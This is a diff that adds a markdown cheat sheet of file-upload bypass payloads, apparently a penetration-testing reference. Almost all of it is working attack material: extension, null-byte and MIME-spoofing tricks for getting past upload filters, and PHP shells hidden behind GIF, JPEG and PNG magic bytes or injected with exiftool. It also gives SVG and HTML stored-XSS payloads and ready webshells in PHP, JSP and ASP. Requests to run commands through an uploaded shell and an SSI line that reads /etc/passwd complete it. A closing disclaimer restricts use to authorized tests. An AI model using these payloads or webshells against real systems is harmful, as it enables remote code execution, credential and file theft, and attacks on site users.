@@ -1,0 +1,171 @@
+# File Upload Bypass Payloads
+
+## 1. EXTENSION BYPASS LIST (avoid .php/.jsp filter)
+
+### Double extensions
+```
+shell.php.jpg
+shell.php.png
+shell.php.txt
+shell.php%00.png
+shell.asp%00.jpg     (null byte - old ASP)
+shell.aspx%00.png
+```
+
+### Case / polyglot
+```
+Shell.PHP
+shell.PhP
+shell.php5
+shell.phtml
+shell.phar
+shell.php7
+shell.php
+shell.pht
+shell.php.     (trailing dot)
+shell.php%20
+shell.php%0a
+shell.php%2e
+shell.jpg.php
+shell.php%00.gif
+shell.php::$DATA        (Windows NTFS stream)
+shell.php::$DATA.jpg
+shell.php .jpg          (space)
+```
+
+### Allowlist bypass via leading image name
+```
+shell.jpg.php
+shell.jpeg.php5
+shell.gif.phtml
+shell.pdf.php
+```
+
+### Server interprets secondary extension
+```
+.php5 .phtml .phar .pht .php3 .php4 .php7 .inc
+.asp .aspx .asmx .ashx .asa .cer .cdx .cshtml .jsp .jspx .jrw .jsw .war
+.shtml .shtm .stm               (SSI - exec command)
+```
+
+## 2. CONTENT-TYPE / MIME SPOOFING
+```
+Content-Type: image/png       (file.ext=shell.php but CT png - some servers only check CT)
+Content-Type: image/jpeg
+Content-Type: image/gif
+Content-Type: multipart/form-data; boundary=...
+```
+With body starting with magic bytes:
+```
+GIF89a;<?php system($_GET['cmd']); ?>          (gif signature)
+\xff\xd8\xff\xe0<?php system($_GET['cmd']); ?>  (JPEG signature)
+\x89PNG\r\n\x1a\n<?php ... ?>                   (PNG signature)
+<?php system($_GET['cmd']); ?>
+```
+
+## 3. MAGIC BYTE BYPASS (header-only checks)
+```
+# append PHP after valid header
+GIF89a
+<?php echo 'test';?>
+
+# exiftool injected comment → PHP executes in some parsers
+exiftool -Comment='<?php system($_GET["cmd"]); ?>' evil.jpg
+exiftool -Comment='<?php ?>' evil.png
+```
+
+## 4. FILENAME TRICK ROUND 2
+```
+shell.php%00.png
+shell.php%0d%0a.png
+shell.php%252e.png
+shell.php/../../aa.png
+shell.php\u0000.png
+shell.%70hp.png
+file.php.png/xyz
+file.jpg;.php
+```
+Win-specific:
+```
+shell.php:=test.jpg
+shell.php::$DATA
+shell.phP
+shell.php%20.jpg
+```
+
+## 5. EMBEDDED IMAGE XSS (stored XSS - always report)
+```xml
+<!-- SVG - top weapon: stored XSS wherever images upload -->
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
+  <text y="20">XSS</text>
+</svg>
+```
+```svg
+<svg xmlns="http://www.w3.org/2000/svg">
+  <foreignObject width="500" height="500">
+    <div xmlns="http://www.w3.org/1999/xhtml">
+      <script>alert(document.domain)</script>
+    </div>
+  </foreignObject>
+</svg>
+```
+```html
+<!-- uploaded .html pages served as-is = stored XSS -->
+<!DOCTYPE html><script>alert(document.domain)</script>
+```
+
+## 6. ZIP-BOMB / DoS upload
+```
+# create huge zip: zip -0 -r bomb.zip bigfile         (marked as 100%)
+# uploading zip that expands hugely = DoS (report as resource abuse)
+```
+
+## 7. WEBSHELLS (for authorized tests)
+PHP (minimal):
+```
+<?php system($_GET['cmd']);?>
+```
+PHP (bypass for short tag/WAF):
+```
+<?=`$_GET[0]`?>
+<?php @eval($_POST['x']);?>
+```
+JSP:
+```
+<% Runtime.getRuntime().exec(request.getParameter("c")); %>
+```
+ASP:
+```
+<% response.write(server.createobject("WSCRIPT.SHELL").exec("cmd /c "&request("c")).stdout.readall) %>
+```
+SFM (server-side include):
+```
+<!--#exec cmd="/bin/cat /etc/passwd"-->
+```
+
+## 8. TEST MATRIX QUICK REFERENCE
+| Goal | Payload |
+|------|---------|
+| Brand-new extension | `shell.phtml` |
+| MIME flip | `Content-Type: image/png` + `.php` suffix |
+| Magic byte | `GIF89a;<?php ...?>` |
+| Windows stream | `shell.php::$DATA` |
+| Control char | `shell.php` + tab/CR (`.php.\x0a.png`) |
+| Double ext | `x.jpg.php` (older filters stripped last ext) |
+| Stored XSS | `.svg` landed in an `<img>` viewer |
+| Path traversal | `../../../../var/www/html/shell.php` |
+
+## 9. POST-UPLOAD CHECKS
+```
+# Find real stored path from error/response JSON
+# If access works, try requesting it directly:
+GET /uploads/<year>/<month>/shell.php?cmd=id
+GET /wp-content/uploads/2026/01/shell.php?cmd=id
+GET /upload/shell.php?0=id
+```
+Any 200 + command output = full RCE. Report with curl PoC.
+
+## DISCLAIMER
+Uploading webshells to a system you don't own is a crime. Only upload proof-of-concept test files (e.g. `<?php echo "poc";?>` then delete) on authorized targets, or use a harmless `test.txt` first.
